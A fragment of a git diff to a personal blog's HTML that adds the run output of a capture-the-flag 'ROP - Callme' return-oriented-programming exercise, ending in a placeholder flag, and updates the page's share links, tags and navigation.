+<p>[+] Starting local process &lsquo;./callme&rsquo;: pid 15670</p>
+<p>[*] running in new terminal: ['/usr/bin/gdb&rsquo;, &lsquo;-q&rsquo;, &lsquo;./callme&rsquo;, &lsquo;15670&rsquo;, &lsquo;-x&rsquo;, &lsquo;/tmp/pwnsm5xq4d2.gdb&rsquo;]</p>
+<p>[+] Waiting for debugger: Done</p>
+<p>[*] Switching to interactive mode</p>
+<p>Thank you!</p>
+<p>[*] Process &lsquo;./callme&rsquo; stopped with exit code 0 (pid 15670)</p>
+<p>callme_one() called correctly</p>
+<p>callme_two() called correctly</p>
+<p>ROPE{a_placeholder_32byte_flag!}</p>
+<p>[*] Got EOF while reading in interactive</p>
 </blockquote>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
@@ -310,23 +486,22 @@ flag{4tt3nt1_4d_u54r3_3cb}<br>
         </div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
-                            <a class="link-to-markdown" href="/ecb-oracle/index.md" target="_blank">Read Markdown</a>
+                            <a class="link-to-markdown" href="/callme/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://w-disaster.github.io/ecb-oracle/" data-title="Crypto - ECB oracle" data-via="https://twitter.com/Luca36436557" data-hashtags="crypto,exploit,aes,ecb"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://w-disaster.github.io/ecb-oracle/" data-hashtag="crypto"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://w-disaster.github.io/ecb-oracle/" data-title="Crypto - ECB oracle"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://w-disaster.github.io/ecb-oracle/" data-title="Crypto - ECB oracle"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://w-disaster.github.io/ecb-oracle/" data-title="Crypto - ECB oracle"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://w-disaster.github.io/callme/" data-title="ROP - Callme" data-via="https://twitter.com/Luca36436557" data-hashtags="returned-oriented programming,rop"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://w-disaster.github.io/callme/" data-hashtag="returned-oriented programming"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://w-disaster.github.io/callme/" data-title="ROP - Callme"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://w-disaster.github.io/callme/" data-title="ROP - Callme"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://w-disaster.github.io/callme/" data-title="ROP - Callme"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/crypto/">crypto</a>,&nbsp;<a href="/tags/exploit/">exploit</a>,&nbsp;<a href="/tags/aes/">aes</a>,&nbsp;<a href="/tags/ecb/">ecb</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/returned-oriented-programming/">returned-oriented programming</a>,&nbsp;<a href="/tags/rop/">rop</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/password-as-keys/" class="prev" rel="prev" title="Crypto - Password as keys"><i class="fas fa-angle-left fa-fw"></i>Crypto - Password as keys</a>
-            <a href="/callme/" class="next" rel="next" title="ROP - Callme">ROP - Callme<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/ecb-oracle/" class="prev" rel="prev" title="Crypto - ECB oracle"><i class="fas fa-angle-left fa-fw"></i>Crypto - ECB oracle</a></div>
 </div>
 <div id="comments"><div id="valine" class="comment"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
